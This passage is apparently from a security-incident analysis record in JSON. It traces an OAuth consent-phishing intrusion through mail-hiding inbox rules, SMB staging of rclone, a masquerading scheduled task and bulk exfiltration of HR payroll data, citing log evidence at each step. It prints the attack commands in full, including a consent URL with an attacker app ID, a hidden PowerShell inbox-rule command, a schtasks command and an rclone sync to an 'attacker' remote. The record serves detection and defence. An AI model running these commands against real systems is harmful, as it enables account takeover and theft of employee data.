    {"ip": "185.193.127.19", "inferred_role": "external_exfil_endpoint", "first_seen": "2025-11-18T10:00:08+0800", "last_seen": "2025-11-18T10:45:22+0800"},
    {"ip": "104.243.41.77", "inferred_role": "external_exfil_endpoint_secondary", "first_seen": "2025-11-18T10:18:14+0800", "last_seen": "2025-11-18T10:42:08+0800"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Initial Access (OAuth consent phishing)", "technique": "T1566 + T1528", "what_happened": "At 2025-11-18 09:14:08 MYT, CORP\\hr.user clicked an email link in Outlook. msedge.exe opened with URL 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=ATTACKER_APP_ID&scope=offline_access%20Mail.Read%20Files.Read.All&response_type=code&redirect_uri=https://hr-payroll-portal.com/auth'. User consented (the URL targets login.microsoftonline.com which is LEGITIMATE Microsoft — the abuse is that the user GRANTED an attacker app the requested scopes). Result: attacker received a refresh token enabling LONG-LIVED API access to hr.user's mailbox + OneDrive WITHOUT password compromise WITHOUT MFA challenge (consented permissions don't require re-auth).", "chain_reason": "Sysmon Event 1 (rule 92067): image=msedge.exe, commandLine contains 'login.microsoftonline.com' + 'oauth2/v2.0/authorize' + 'scope=offline_access Mail.Read Files.Read.All' + 'redirect_uri=https://hr-payroll-portal.com/auth'. The redirect URI is the smoking gun: hr-payroll-portal.com is a typosquat suggesting an HR app but the actual corporate HR portal is hr.corp.local. The OAuth flow itself uses Microsoft endpoints (login.microsoftonline.com is legitimate) — the malicious indicator is the redirect_uri pointing to attacker infrastructure.", "first_seen": "2025-11-18T09:14:08+0800"},
    {"step": 2, "tactic": "Defense Evasion / Persistence", "technique": "T1564.008 + T1098", "what_happened": "At 09:32:14 MYT, a non-interactive PowerShell was launched on LAPTOP-HR03 under CORP\\hr.user with commandLine: 'powershell.exe -NoProfile -WindowStyle Hidden -Command \"Import-Module ExchangeOnlineManagement; Connect-ExchangeOnline -ShowBanner:$false; New-InboxRule -Mailbox hr.user@corp.local -Name `Payroll Sync` -From `noreply@corp-payroll.com` -MoveToFolder `RSS Subscriptions` -StopProcessingRules \$true\"'. The rule moves all emails matching the corporate payroll sender to the rarely-checked RSS Subscriptions folder + stops further rule processing = the user will NEVER see payroll alerts, breach notifications, or any email from that sender.", "chain_reason": "Sysmon Event 1 (rule 92070): image=powershell.exe with -NoProfile + -WindowStyle Hidden + Import-Module ExchangeOnlineManagement + New-InboxRule. Triple-flag pattern: (a) -WindowStyle Hidden has zero legitimate end-user case, (b) ExchangeOnlineManagement module is admin tooling, (c) MoveToFolder 'RSS Subscriptions' + StopProcessingRules = email-hiding intent. parentImage=explorer.exe means user-launched — likely via a desktop shortcut or VBScript triggered by the same phishing flow.", "first_seen": "2025-11-18T09:32:14+0800"},
    {"step": 3, "tactic": "Lateral Movement / Tool Staging", "technique": "T1021.002 + T1105", "what_happened": "At 09:42:11 MYT, hr.user pivoted to FILESVR-03 via SMB (legitimate HR user has read access to HR Payroll share). At 09:43:08 the attacker dropped rclone.exe + rclone.conf to C:\\ProgramData\\rclone\\ on FILESVR-03. rclone.exe is a public commercial cloud sync utility — legitimate tool, illegitimate context (NOT in corporate software inventory, not pushed by SCCM).", "chain_reason": "Sysmon Event 11 on FILESVR-03: targetFilename=C:\\ProgramData\\rclone\\rclone.exe + C:\\ProgramData\\rclone\\rclone.conf, image=cmd.exe via remote SMB session originating from 10.42.20.13 (LAPTOP-HR03). Windows Security Event 4624 logonType=3 (network logon) on FILESVR-03 with targetUserName=hr.user, sourceIp=10.42.20.13.", "first_seen": "2025-11-18T09:42:11+0800"},
    {"step": 4, "tactic": "Persistence", "technique": "T1053.005", "what_happened": "At 09:45:22 MYT, schtasks.exe on FILESVR-03 created a scheduled task with the DECEPTIVE name 'Microsoft\\Office\\OfficeTelemetry' (masquerading as a legitimate Microsoft Office telemetry task) running C:\\ProgramData\\rclone\\rclone.ps1 hourly. The task path 'Microsoft\\Office\\OfficeTelemetry' DOES NOT EXIST in any real Microsoft Office install — masquerading T1036.005.", "chain_reason": "Sysmon Event 1 (rule 92068): image=schtasks.exe, commandLine='schtasks.exe /Create /TN \"Microsoft\\Office\\OfficeTelemetry\" /TR \"C:\\ProgramData\\rclone\\rclone.ps1\" /SC HOURLY /RU SYSTEM' — the SYSTEM run-as context is the smoking gun (legitimate Office Telemetry tasks run in user context, not SYSTEM, and they live in Microsoft\\Office\\, not Microsoft\\Office\\OfficeTelemetry).", "first_seen": "2025-11-18T09:45:22+0800"},
    {"step": 5, "tactic": "Collection / Exfiltration", "technique": "T1567.002 + T1119", "what_happened": "At 10:00:08 (the scheduled task's first fire), rclone.ps1 launched rclone.exe with commandLine 'rclone.exe sync D:\\Shares\\HR\\Payroll\\ attacker:hr-backup --config C:\\ProgramData\\rclone\\rclone.conf --transfers 8'. Suricata logged sustained HTTPS egress from FILESVR-03 (10.42.30.3) to TWO external destinations: 185.193.127.19 (primary) AND 104.243.41.77 (secondary, started at 10:18). Total egress over 45 min: 28 GB of HR payroll data (salary, bank details, tax records, PII for ~3400 employees).", "chain_reason": "Sysmon Event 1 (rule 92070): image=rclone.exe, commandLine matches 'sync D:\\Shares\\HR\\Payroll' + 'attacker:hr-backup' + 'rclone.conf'. Suricata rule 86460 (ET POLICY Outbound HTTPS from File Server to External Cloud Storage — non-corporate destination) repeated 47 times in 45 min. The two destinations indicate rclone configured with multiple cloud backends (primary + redundancy).", "first_seen": "2025-11-18T10:00:08+0800"}
  ],
